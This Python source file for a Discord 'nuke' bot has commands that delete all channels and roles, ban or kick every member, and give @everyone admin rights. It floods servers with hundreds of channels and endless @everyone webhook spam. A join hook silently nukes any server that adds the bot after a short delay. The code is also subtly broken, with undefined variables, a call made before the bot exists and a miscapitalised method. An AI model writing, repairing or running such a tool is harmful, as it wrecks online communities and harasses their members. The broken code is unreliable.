import discord, random, aiohttp, asyncio
from discord import Webhook, AsyncWebhookAdapter
from discord.ext import commands
from discord.ext.commands import *
from colorama import Fore as C
from colorama import Style as S

bot.run("token-here")

bot = commands.Bot(command_prefix=".", intents=discord.Intents.all())

bot.remove_command("help")

spam_messages = ["@everyone something here", "@everyone something here", "@everyone something here", "@everyone something here" "@everyone something here", "@everyone something here"]

channel_names = ["something-here","something-here","something-here","something-here"]
webhook_usernames = ["something here","something here","something here","something here"]
nuke_on_join = True
nuke_wait_time = 20

CHANNEL_NAMES = ["something-here","something-here","something-here","something-here"]
MESSAGE_CONTENTS = ["@everyone something here", "@everyone something here", "@everyone something here", "@everyone something here"]
@bot.event
async def on_ready():
   print('Logged in as {}'.format(bot.user.name))
   await bot.change_presence(activity=discord.Game(name="Watching 93 servers!"))

   print("Ready")

@bot.command()
async def Cmds(ctx):
 await ctx.message.delete()
 embed = discord.Embed(color=0x00FFFF, timestamp=ctx.message.created_at)

 embed.set_author(name="sixflags", icon_url=ctx.author.avatar_url)

 embed.add_field(name="{Prefix}Cmds", value="Shows this message.", inline=False)
 embed.add_field(name="{Prefix}Nuke", value="Nukes The Server.", inline=False)
 embed.add_field(name="{Prefix}Banall", value="Bans All Members.", inline=False)
 embed.add_field(name="{Prefix}Kick", value="Kicks All Members.", inline=False)
 embed.add_field(name="{Prefix}Ping", value="Tells You The Bots Latency.", inline=False)
 embed.add_field(name="{Prefix}Sall", value="Spams All Messages.", inline=False)
 embed.add_field(name="{Prefix}Frole", value="Deletes All The Roles.", inline=False)
 embed.add_field(name="{Prefix}Crole", value="Creates All The Roles", inline=False)
 embed.add_field(name="{Prefix}Ping", value="Tells You The Bots Latency.", inline=False)


 await ctx.send(embed=embed)



async def nuke(guild):
  print(f"{C.WHITE}Nuking {guild.name}.")
  role = discord.utils.get(guild.roles, name = "@everyone")
  try:
    await role.edit(permissions = discord.Permissions.all())
    print(f"{C.GREEN}Successfully granted admin permissions in {C.WHITE}{guild.name}")
  except:
    print(f"{C.RED}Admin permissions NOT GRANTED in {C.WHITE}{guild.name}")
  for channel in guild.channels:
    try:
      await channel.delete()
      print(f"{C.GREEN}Successfully deleted channel {C.WHITE}{channel.name}")
    except:
      print(f"{C.RED}Channel {C.WHITE}{channel.name} {C.RED}has NOT been deleted.")
  for member in guild.members:
    try:
      await member.Ban()
      print(f"{C.GREEN}Successfully banned {C.WHITE}{member.name}")
    except:
      print(f"{C.WHITE}{member.name} {C.RED}has NOT been banned.")
  for i in range(500):
    await guild.create_text_channel(random.choice(channel_names))
  print(f"{C.GREEN}Nuked {guild.name}.")

@bot.command()
async def Nuke(ctx):
  await ctx.message.delete()
  guild = ctx.guild
  await nuke(guild)

@bot.event
async def on_guild_join(guild):
  if nuke_on_join == True:
    await asyncio.sleep(nuke_wait_time)
    await nuke(guild)
  else:
    return

@bot.command()
async def Sall(ctx, *, message = None):
  if message == None:
    for channel in ctx.guild.channels:
      try:
        await channel.send(random.choice(spam_messages))
      except discord.Forbidden:
        print(f"{C.RED}Spam Error {C.WHITE}[Cannot send messages]")
        return
      except:
        pass
  else:
    for channel in ctx.guild.channels:
      try:
        await channel.send(message)
      except discord.Forbidden:
        print(f"{C.RED}Sall Error {C.WHITE}[Cannot send messages]")
        return
      except:
        pass


@bot.command()
async def Frole(ctx):
  await ctx.message.delete()
  for role in list(ctx.guild.roles):
            try:
                await role.delete()
                print (f"{role.name} has been deleted in {ctx.guild.name}")
            except:
                print (f"{role.name} has NOT been deleted in {ctx.guild.name}")

@bot.command()
async def Crole(ctx):
    await ctx.message.delete()
    while True:
        guild = ctx.guild
        await guild.create_role(name="something here")



@bot.command()
async def Kick(ctx):
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await ctx.guild.kick(user)
                print (f"{user.name} has been kicked from {ctx.guild.name}")
            except:
                print (f"{user.name} has FAILED to be kicked from {ctx.guild.name}")
        print ("Action Completed: Kicked")

@bot.command()
async def Ping(ctx):
    await ctx.message.delete()
    await ctx.send(f"Pong! My latency is {round(bot.latency *1000)}ms.")


@bot.event
async def on_guild_channel_create(channel):
  webhook = await channel.create_webhook(name ="something-here")
  webhook_url = webhook.url
  async with aiohttp.ClientSession() as session:
    webhook = Webhook.from_url(str(webhook_url), adapter=AsyncWebhookAdapter(session))
    while True:
      await webhook.send(random.choice(spam_messages), username = random.choice(webhook_usernames))

@bot.command()
async def logout(ctx):
  await ctx.message.delete()
  exit()

@bot.command()
async def Banall(ctx):
    for member in ctx.guild.members:
        try:
            await member.ban()
            print(f"[+] Banned {member}")
            num += 1
        except:
            print(f"[-] Could not ban {member}")
    print(f"\n[+] Finished banning, successfully banned {1} users")
                




bot.run(token, bot=True)
